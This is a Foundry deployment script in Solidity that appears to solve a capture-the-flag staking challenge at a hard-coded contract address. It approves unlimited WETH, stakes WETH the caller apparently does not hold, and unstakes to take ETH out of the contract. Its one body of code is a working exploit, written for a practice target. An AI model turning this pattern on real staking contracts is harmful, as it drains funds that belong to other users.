/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStake {
    function totalStaked() external returns (uint256);

    function UserStake(address) external returns (uint256);

    function Stakers(address) external returns (bool);

    function WETH() external returns (address);

    function StakeETH() external payable;

    function StakeWETH(uint256 amount) external;

    function Unstake(uint256 amount) external returns (bool);
}

contract Stake is Script {
    function run() public {
        vm.startBroadcast();

        address instance = 0xbD947bd71FCe1fE31e558E0Bd804AfCD22f93F81;

        // To avoid doing a contract just for this purpose, stake with a different private key
        // IStake(instance).StakeETH{value: 2000000000000000}();
        IWETH(IStake(instance).WETH()).approve(instance, type(uint256).max);
        IStake(instance).StakeWETH(1000000000000001);
        IStake(instance).Unstake(1000000000000001);

        vm.stopBroadcast();
    }
}
